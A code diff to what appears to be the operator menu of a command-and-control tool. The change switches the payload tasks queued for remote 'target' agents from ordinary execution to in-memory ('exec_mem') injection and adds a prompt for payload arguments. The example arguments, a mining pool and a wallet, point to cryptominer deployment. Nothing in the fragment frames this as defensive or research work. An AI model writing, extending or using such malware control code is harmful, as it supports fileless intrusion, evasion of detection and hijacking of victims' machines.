@@ -758,8 +758,15 @@ def menu_interact():
                 print("  (No payloads directory found)")
 
             p = input("Payload name > ")
-            update_agent_task(target, f"exec {p}")
-            print("Injection task queued.")
+            args = input("Command-line arguments (e.g., '-o pool:3333 -u wallet'): ")
+
+            # The syntax we will use is "exec_mem <payload> <args...>"
+            if args.strip():
+                update_agent_task(target, f"exec_mem {p} {args}")
+            else:
+                update_agent_task(target, f"exec_mem {p}")
+
+            print(f"In-memory injection task queued for {p} with args: '{args}'.")
             time.sleep(1)
         elif choice == '0':
             break
